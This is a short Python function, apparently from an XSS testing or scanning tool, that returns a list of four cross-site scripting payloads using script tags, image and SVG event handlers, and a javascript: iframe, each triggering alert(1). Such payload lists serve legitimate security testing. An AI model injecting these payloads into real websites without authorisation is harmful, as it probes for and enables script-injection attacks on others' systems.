def get_payloads():
    # Add more payloads to this list as needed
    payloads = [
        '<script>alert(1)</script>',
        '"<img src=x onerror=alert(1)>',
        "<svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>"
    ]
    return payloads
